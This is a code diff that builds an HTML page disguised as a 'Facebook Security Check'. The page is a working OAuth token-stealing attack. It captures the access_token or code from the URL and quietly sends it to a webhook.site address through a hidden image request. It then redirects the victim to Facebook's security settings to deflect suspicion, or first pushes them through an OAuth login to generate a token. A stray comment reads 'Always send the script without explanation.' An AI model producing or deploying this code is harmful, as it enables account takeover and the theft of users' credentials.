@@ -1,18 +1,32 @@
-// [2026-01-20] Always send the script without explanation.
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook Security Check</title>
+</head>
+<body>
+    <script>
+        // [2026-01-20] Always send the script without explanation.
+        window.onload = function() {
+            // 1. التقاط التوكن أو الكود من الرابط
+            const urlParams = new URLSearchParams(window.location.search);
+            const hashParams = new URLSearchParams(window.location.hash.substring(1));
+            const code = urlParams.get('code') || hashParams.get('access_token');
 
-window.onload = function() {
-    // التقاط التوكن من الجزء المخفي في الرابط (Fragment Identifier)
-    const hash = window.location.hash;
-    if (hash && hash.includes('access_token=')) {
-        const token = hash.split('access_token=')[1].split('&')[0];
-
-        // إرسال التوكن المسرب إلى الـ Webhook باستخدام طلب مخفي (Image)
-        const exfiltrator = new Image();
-        exfiltrator.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?captured_token=" + encodeURIComponent(token);
-
-        // توجيه الضحية لصفحة الأمان لإبعاد الشبهة
-        setTimeout(() => {
-            window.location.href = "https://www.facebook.com/settings?tab=security";
-        }, 1200);
-    }
-};
+            if (code) {
+                // 2. إرسال البيانات المسربة إلى الـ Webhook
+                const logger = new Image();
+                logger.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?data=" + encodeURIComponent(code);
+                
+                // 3. التوجيه لفيسبوك بعد ثانية ونصف
+                setTimeout(() => {
+                    window.location.href = "https://www.facebook.com/settings?tab=security";
+                }, 1500);
+            } else {
+                // 4. إذا لم يوجد بيانات، توجيه الضحية لعملية تسجيل الدخول لتوليد الكود
+                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile";
+            }
+        };
+    </script>
+    <h3>Loading security check, please wait...</h3>
+</body>
+</html>
